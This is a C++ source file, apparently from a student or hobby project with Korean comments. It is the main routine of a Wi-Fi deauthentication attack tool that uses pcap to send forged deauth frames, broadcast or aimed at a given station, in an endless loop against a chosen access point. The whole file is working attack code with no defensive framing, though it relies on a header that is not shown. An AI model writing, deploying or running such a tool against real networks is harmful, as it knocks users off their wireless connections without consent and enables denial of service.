// DeauthAttackMain.cpp

#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include "DeauthAttack.h"

void usage() {
    printf("syntax: deauth-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int main(int argc, char* argv[])
{
    if (argc != 3 && argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    int  count = 0;
    DeauthPacket*  deauthPackets = nullptr;

    if(argc == 3)
    {
        Mac  apMac(argv[2]);
        count = 1;  // AP의 mac만 주어진 경우 브로드캐스트용 하나
        deauthPackets = new DeauthPacket[count];
        InitDeauthApBroadcast(&deauthPackets[0], apMac);
    }
    
    else
    {
        Mac  apMac(argv[2]);
        Mac  staMac(argv[3]);
        count = 2;  // 유니캐스트용 두 개
        deauthPackets = new DeauthPacket[count];
        InitDeauthApUnicast(&deauthPackets[0], apMac, staMac);
        InitDeauthStaUnicast(&deauthPackets[1], apMac, staMac);
    }

    while(true)
    {
        for(int i = 0; i < count; i++)
        {
            int res = pcap_sendpacket(
                handle, 
                reinterpret_cast<const u_char*>( &deauthPackets[i] ), 
                sizeof(DeauthPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            else
            {
                printf("sending deauth packet...\n");
            }
        }
        usleep(1000);
    }

    delete[] deauthPackets;
    pcap_close(handle);

    return 0;
}